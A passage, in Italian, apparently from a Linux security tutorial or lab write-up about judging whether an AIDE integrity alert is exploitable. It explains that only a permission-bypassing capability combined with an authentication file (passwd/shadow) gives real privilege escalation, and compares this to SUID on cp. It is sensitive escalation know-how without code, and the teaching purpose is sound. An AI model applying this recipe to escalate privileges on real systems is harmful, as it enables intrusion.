distinguere "AIDE ha trovato una modifica" da "la modifica è sfruttabile" — un binario con ACL
generosa ma senza privilegi speciali di partenza, o un bit SGID su un gruppo di cui non fai parte,
non ti avvicinano a root. Solo la combinazione **capability che bypassa i controlli di permesso** +
**file di sistema che controlla l'autenticazione** è la ricetta di un privesc reale — la stessa
logica del primo caso (SUID su `cp` per riscrivere `passwd`/`shadow`), ma con un meccanismo di
bypass diverso (capability invece di SUID).
